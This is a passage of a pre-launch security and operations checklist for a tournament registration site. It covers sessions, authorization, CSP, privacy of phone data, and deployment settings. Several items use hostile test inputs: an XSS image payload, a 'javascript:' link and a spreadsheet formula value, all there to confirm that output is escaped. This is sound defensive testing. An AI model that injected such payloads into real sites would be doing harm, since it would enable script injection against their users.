- [ ] A recovery-scoped session gets `403 recovery_scope_only` on every endpoint outside §4.4.
- [ ] **`POST /admin/users/:id/suspend` with `{"until": null}` blocks a fresh sign-in.** Suspend,
      then complete a full passkey ceremony as that user → `403 forbidden`,
      `details.reason: "suspended"`. (An epoch bump alone would let them straight back in.)
- [ ] `ADMIN_BOOTSTRAP_TOKEN` is set, the bootstrap works once, the second attempt gets `409`, and the
      secret is **deleted** afterwards.
- [ ] A role change immediately invalidates the target's existing sessions (epoch bump verified).

**Authorization**
- [ ] Player calling `PUT /organizer/matches/:id/score` → `404`.
- [ ] Organizer A calling any endpoint on organizer B's tournament → `403`/`404`.
- [ ] Player A calling `PATCH /entrants/<B's id>` → `404`.
- [ ] `PATCH /me` with `{"role":"admin"}` in the body → `400 validation_failed`, role unchanged.
- [ ] A `draft` tournament returns `404` on every public endpoint.
- [ ] A score submission naming an entrant not in the match → `400`.
- [ ] A `winner_entrant_id` contradicting the scores → `400`.
- [ ] **A revoked co-organizer gets `403`/`404` on `PUT /organizer/matches/:id/score`.** Add them,
      confirm the score write works, `DELETE .../organizers/:handle`, retry the *same* request from
      the *same* session. It must fail. (Their session is deliberately not revoked; the predicate is.)
- [ ] **A `scorer` is refused the privileged surface**: `GET /organizer/entrants/:id/contact`,
      `entrants.csv?include_contact=true`, `PATCH /organizer/entrants/:id` with `payment_status`,
      and `POST .../publish` all return `403 forbidden`, `details.reason: "role_insufficient"` —
      while `PUT .../score` and `POST .../lobby-results` still succeed.
- [ ] **`GET /api/v1/entrants/:id` with another player's entrant id → `404`**, using an id read
      straight out of the public `GET /tournaments/:slug/entrants`. Then repeat as a non-captain
      roster member of that entrant → `200`, and as that member `PATCH` it → `404`.
- [ ] **A join code from tournament A does not work on tournament B's guest registration** →
      `403 invalid_join_code`.
- [ ] **A `single_use` join code redeemed twice concurrently produces exactly one entrant** and one
      `410 gone`.
- [ ] **A stale score write commits nothing.** Submit with a `result_version` that is one behind:
      the response is `409 stale_version` **and** the match's downstream slots, `match_audit` and
      `state_version` are all unchanged. Verify by reading the rows, not by trusting the status code.

**Web**
- [ ] CSP shipped `report-only` for one week, reports reviewed, then flipped to `enforce`.
- [ ] `script-src` contains **no** `'unsafe-inline'` and no `'unsafe-eval'`; the site still hydrates
      (check for the mobile menu and a reveal animation working, not just a 200 — a broken hydration
      produces no console error).
- [ ] `publickey-credentials-get=(self)` is present in `Permissions-Policy` and passkeys still work.
- [ ] `curl -I http://nellore.club` → 301 to https **with** the HSTS header on the redirect.
- [ ] A team name of `<img src=x onerror=alert(1)>` renders as literal text everywhere it appears,
      including in the WhatsApp preview `<meta>` tags (view source of `/t/<slug>/`).
- [ ] A rules block containing `[x](javascript:alert(1))` renders as plain text, not a link.
- [ ] `entrants.csv` with a team named `=1+1` opens in Excel showing the literal text.
- [ ] `grep -r dangerouslySetInnerHTML` returns nothing.

**Data and privacy**
- [ ] No public endpoint returns a phone number (grep the response schemas; then curl and grep the
      actual bodies).
- [ ] `GET /organizer/.../entrants` returns `phone_last4`, never `phone_e164`.
- [ ] **Register a BGMI squad using the shipped form (which has four `tel` presets), then
      `SELECT fields_json FROM entrants` and `FROM entrant_members` in the D1 console. No 10-digit
      number appears in either blob** — only `+91 ••••• •NNNN` (§10.2.1). Then confirm
      `GET /organizer/tournaments/:id/entrants` and `entrants.csv` (both with and without
      `include_contact`) contain no plaintext number outside the single `phone_e164` column.
- [ ] Every call to `/entrants/:id/contact` produces exactly one audit row.
- [ ] `GET /me/export` returns the full record; `DELETE /me` revokes sessions immediately.
- [ ] **The nightly cron runs all eleven jobs** (AUTH.md §10.1–§10.9) and its log line names each
      one with a row count. Specifically verify: a tournament past `registration_opens_at` moves to
      `registration_open`; a `confirmed` entrant past `checkin_closes_at` becomes `no_show`
      **with a non-null `status_changed_at`**; and a user 31 days past `deletion_requested_at` is
      anonymised with their handle rewritten and their entrant rows retained.
- [ ] `/privacy/` names a grievance officer and states the retention periods in §10.4.

**Operations**
- [ ] `grep -rE "(secret|token|key|pepper)" wrangler.jsonc` finds no values.
- [ ] `.gitignore` contains **all** of `.dev.vars`, `.dev.vars.*`, `.env`, `.env.*`, `.wrangler/`,
      `*.sqlite`, `*.sqlite3`, `db/backups/`, and `git log -p` shows none of them were ever
      committed. Verify with `git check-ignore -v .dev.vars.production .env.local db/backups/x.sql`
      — a partial list passes a lazy eyeball and still leaves `.dev.vars.production`, the exact file
      a hurried operator creates, committable.
- [ ] **`wrangler.jsonc` uses `"ratelimits"` (plural) with `"name"` per entry**, and a boot
      assertion fails loudly if any `RL_*` binding is `undefined` (ARCHITECTURE.md §7). The key
      `"ratelimit"` is silently ignored by wrangler, so the deploy succeeds and every endpoint 500s
      on the first request.
- [ ] **`wrangler.jsonc` has `routes` for `nellore.club/*` and `www.nellore.club/*`.** Without them
      the Worker only answers on `*.workers.dev` and the www→apex 301 never runs.
- [ ] Every secret in AUTH.md §11 is set in production (`wrangler secret list`).
- [ ] The nightly cron trigger is configured and its first run is verified in the logs.
- [ ] A billing alert exists at 3× expected spend.
- [ ] `wrangler d1 export` runs, and the backup is stored encrypted outside the repo.
- [ ] Load-check the live path: 200 concurrent conditional GETs on one bracket produce ≲ 15 origin
      requests per minute and a p95 under 200 ms.
